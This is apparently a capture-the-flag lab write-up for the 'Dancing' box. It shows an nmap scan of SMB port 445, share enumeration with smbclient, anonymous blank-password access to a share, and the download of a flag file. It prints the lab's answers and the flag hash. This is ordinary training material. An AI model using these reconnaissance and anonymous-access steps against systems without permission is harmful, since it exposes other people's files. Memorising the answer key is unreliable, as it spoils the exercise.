# Dancing

- **Category**: Starting Point - Tier 0
- **Difficulty**: Very Easy
- **Tags**: Network, Protocols, SMB, Reconnaissance, Anonymous/Guest Access
- **Tools**: nmap, smbclient


# Walkthrough

## Task 1: What does the 3-letter acronym SMB stand for?

> **Answer**: Server Message Block

## Task 2: What port does SMB use to operate at?

> **Answer**: 445

## Task 3: What is the service name for port 445 that came up in our Nmap scan?

We can use the `-sV` flag to tell Nmap to probe for the service.

```bash
> nmap -sV -p 445 10.129.1.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:26 AEST
Nmap scan report for 10.129.1.12
Host is up (0.24s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

```

> **Answer**: microsoft-ds

## Task 4: What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?

> **Answer**: -L

## Task 5: How many shares are there on Dancing?

We can use `smbclient` to figure this out, along with the `-L` flag.

We don't need to provide a password as we're attempting to show guest-browseable shares.

```bash
> smbclient -L 10.129.1.12
Password for [WORKGROUP\user]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      

```

> **Answer**: 4

## Task 6: What is the name of the share we are able to access in the end with a blank password?

> **Answer**: WorkShares

## Task 7: What is the command we can use within the SMB shell to download the files we find?

> **Answer**: get

# Submit Root Flag

```bash
> smbclient //10.129.1.12/WorkShares
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  4 22:38:12 2023
  ..                                  D        0  Tue Jul  4 22:38:12 2023
  Amy.J                               D        0  Mon Mar 29 20:08:24 2021
  James.P                             D        0  Thu Jun  3 18:38:03 2021

                5114111 blocks of size 4096. 1748960 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 18:38:03 2021
  ..                                  D        0  Thu Jun  3 18:38:03 2021
  flag.txt                            A       32  Mon Mar 29 20:26:57 2021

                5114111 blocks of size 4096. 1748960 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \James.P\> exit
> cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

> **Answer**: 5f61c10dffbc77a704d76016a22f1664
